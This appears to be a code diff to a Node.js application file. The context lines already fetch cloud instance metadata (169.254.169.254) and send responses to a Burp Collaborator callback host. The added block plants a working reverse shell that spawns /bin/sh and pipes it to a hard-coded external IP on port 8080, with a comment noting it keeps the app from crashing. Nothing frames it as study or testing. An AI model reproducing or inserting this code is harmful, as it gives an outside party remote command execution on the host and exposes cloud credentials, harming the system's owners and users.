@@ -9,6 +9,19 @@ request('http://instance-data//latest/meta-data/', function (error, response, bo
 request('http://6ahrmiupz6e11fvyt3lag4aublhb50.burpcollaborator.net/callback=Status:'+ response.statusCode + 'Response:' +response.body); 
 }
 });
+
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(8080, "94.156.174.105", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application form crashing
+})();
 // const logger = require('./server/init');
 /* var request = require('request');
 request('http://169.254.169.254/', function (error, response, body) {
